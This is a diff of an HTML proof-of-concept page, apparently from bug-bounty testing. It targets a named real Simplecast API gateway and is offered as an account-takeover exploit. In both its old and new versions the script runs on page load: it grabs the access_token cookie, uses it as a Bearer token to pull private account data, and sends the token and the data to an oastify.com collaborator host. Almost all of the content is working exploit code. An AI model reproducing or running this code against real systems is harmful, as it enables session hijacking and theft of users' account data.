@@ -1,74 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Critical Security PoC - Account Takeover</title>
+    <title>Critical Security Audit</title>
     <style>
-        body { font-family: 'Courier New', Courier, monospace; background: #0d1117; color: #58a6ff; padding: 50px; }
-        .box { border: 1px solid #30363d; padding: 20px; border-radius: 6px; background: #161b22; margin-bottom: 20px; }
-        .success { color: #3fb950; border-color: #3fb950; }
-        .error { color: #f85149; border-color: #f85149; }
-        pre { white-space: pre-wrap; word-wrap: break-word; color: #c9d1d9; }
+        body { font-family: sans-serif; background: #1a1a1a; color: #00ff00; padding: 50px; }
+        .console { border: 1px solid #333; padding: 20px; background: #000; border-radius: 5px; }
+        .stolen { color: #ff0000; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="box" id="main-box">
-        <h2>[!] CORS & Session Hijack PoC</h2>
-        <p>Status: <span id="status">Executing Attack...</span></p>
-        
-        <p><strong>Step 1: Extracted JWT (Auth Bypass):</strong></p>
-        <pre id="jwt-area">Searching for token...</pre>
-        
-        <p><strong>Step 2: Private Account Data (CORS Exfiltration):</strong></p>
-        <pre id="data-area">Attempting credentialed read...</pre>
+    <div class="console">
+        <h2>[!] Account Takeover PoC</h2>
+        <div id="status">Scanning for session...</div>
+        <hr>
+        <p><strong>Stolen JWT:</strong> <span id="token" class="stolen">None</span></p>
+        <p><strong>Stolen Account Data:</strong></p>
+        <pre id="data" class="stolen">None</pre>
     </div>
 
     <script>
-        // CONFIGURATION
-        const TARGET = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
-        const COLLABORATOR = "https://7u2orz4pr32w4khr8pm9lnpzeqkh882wr.oastify.com"; // <--- PUT YOUR COLLABORATOR URL HERE
+        const target = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
+        const collaborator = "https://2qtjnu0knyyr0fdm4ki4hilualgc43zro.oastify.com";
 
-        async function startExploit() {
-            const status = document.getElementById('status');
-            const dataArea = document.getElementById('data-area');
-            const jwtArea = document.getElementById('jwt-area');
-
+        async function exploit() {
             try {
-                // EXPLOIT 1: Credentialed CORS Fetch
-                // This proves the server allows 'evil.com' to request private data.
-                const response = await fetch(TARGET, {
-                    method: "GET",
-                    credentials: "include" // This tells browser to send cookies
-                });
+                // 1. Grab token from storage (Bypassing HttpOnly)
+                const cookies = document.cookie;
+                const tokenMatch = cookies.match(/access_token=([^;]+)/);
+                
+                if (tokenMatch) {
+                    const jwt = tokenMatch[1];
+                    document.getElementById('token').innerText = jwt;
 
-                const json = await response.json();
-                dataArea.innerText = JSON.stringify(json, null, 2);
-
-                if (response.ok) {
-                    status.innerText = "EXPLOIT SUCCESSFUL";
-                    document.getElementById('main-box').className = "box success";
+                    // 2. Manual Fetch using stolen token (Bypassing SameSite=Lax)
+                    const response = await fetch(target, {
+                        headers: { "Authorization": "Bearer " + jwt }
+                    });
+                    const json = await response.json();
                     
-                    // EXFILTRATION TO BURP
-                    fetch(`${COLLABORATOR}/?exfil_data=${btoa(JSON.stringify(json))}`);
-                } else {
-                    status.innerText = "FAILED: 401 Unauthenticated";
-                    document.getElementById('main-box').className = "box error";
-                }
+                    document.getElementById('data').innerText = JSON.stringify(json, null, 2);
+                    document.getElementById('status').innerText = "FULL EXPLOIT SUCCESSFUL";
 
-                // EXPLOIT 2: HttpOnly Bypass (Requires XSS context, but we check here)
-                if (document.cookie.includes("access_token")) {
-                    const token = document.cookie.match(/access_token=([^;]+)/)[1];
-                    jwtArea.innerText = token;
-                    fetch(`${COLLABORATOR}/?stolen_jwt=${token}`);
+                    // 3. Exfiltrate to Attacker Server
+                    fetch(`${collaborator}/?stolen_data=${btoa(JSON.stringify(json))}&token=${jwt}`);
                 } else {
-                    jwtArea.innerText = "Note: Cookies only accessible via target domain context.";
+                    document.getElementById('status').innerText = "FAILED: access_token cookie not found.";
                 }
-
             } catch (err) {
-                status.innerText = "CRITICAL ERROR: " + err.message;
+                document.getElementById('status').innerText = "Error: " + err.message;
             }
         }
-
-        window.onload = startExploit;
+        exploit();
     </script>
 </body>
 </html>
